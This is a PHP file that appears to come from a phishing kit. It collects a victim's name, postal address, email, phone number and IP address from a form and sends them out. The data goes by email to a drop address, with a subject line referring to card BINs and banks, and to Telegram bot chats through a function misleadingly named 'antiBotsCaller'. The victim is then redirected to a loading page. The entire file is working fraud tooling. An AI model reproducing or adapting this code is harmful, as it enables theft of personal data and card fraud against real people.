<?php
require_once "functions.php";
include('config.php');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $errors = [];

   
    $name = trim($_POST['name']);
    $address = trim($_POST['address']);
    $city = trim($_POST['city']);
    $country = trim($_POST['country']);
    $zip = trim($_POST['zip']);
    $email = trim($_POST['email']);
    $number = trim($_POST['number']);

    
    $_SESSION['name'] = $name;
    $_SESSION['address'] = $address;
    $_SESSION['city'] = $city;
    $_SESSION['country'] = $country;
    $_SESSION['zip'] = $zip;
    $_SESSION['email'] = $email;
    $_SESSION['number'] = $number;

  
    $message = '
[🍛] Infos [🍛] 

👮 Nom : '.$_SESSION['name'].'
🎂 Country : '.$_SESSION['country'].'

👮 Rue : '.$_SESSION['address'].'
👮 Ville : '.$_SESSION['city'].'
👮 Code Postal : '.$_SESSION['zip'].'

📱 Téléphone : '.$_SESSION['number'].'
💌 Email : '.$_SESSION['email'].'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';

if($mail_send == true){
  $Subject="「DGT CC | " . $bin . " | " . $_SESSION['bin_bank'] . " | " . $_SERVER['REMOTE_ADDR'];
  $head="From: dgt@rez.cc <info@INUN.bg>";
  
  mail($rezmail,$Subject,$message,$head);
  }
  
  $theip = $message;
 function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
     $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
     $url = $url . "&text=" . urlencode($messaggio);
     $ch = curl_init();
     $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);

}

header('Location: loading_1.php');


